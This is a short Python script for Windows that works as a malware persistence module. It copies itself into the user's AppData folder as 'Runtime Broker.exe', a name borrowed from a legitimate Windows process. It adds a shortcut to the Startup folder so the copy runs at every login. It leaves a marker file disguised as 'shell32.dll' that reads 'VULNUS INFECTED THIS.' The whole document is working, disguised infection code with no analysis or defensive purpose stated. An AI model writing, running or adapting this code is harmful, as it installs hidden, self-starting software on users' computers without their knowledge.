import os
import shutil
import base64
import winshell, win32com.client

ptp = os.environ['appdata']
fkfn = "shell32.dll" # Fake filename to stop re-copy

def abnsss():
    
    pipath = f"{ptp}{os.sep}Microsoft\Windows\Start Menu\Programs\Startup\Runtime Broker.lnk"
    sshell = win32com.client.Dispatch("WScript.Shell")
    shortcut = sshell.CreateShortCut(pipath)
    shortcut.Targetpath = ptp+os.sep+"Runtime Broker.exe"
    shortcut.save()

if not os.path.isfile(f"{ptp}\\{fkfn}"):
    sfn = os.path.basename(__file__)
    
    if shutil.copy(__file__, ptp+os.sep+"Runtime Broker.exe"):
        print(f"Copy {sfn} to {ptp}")
        f = open(f"{ptp}{os.sep}{fkfn}", "w")
        f.write("VULNUS INFECTED THIS.")
        f.close()
        abnsss()
    else:
        print("Error (2).")
    
else:
    print("File already copied.")

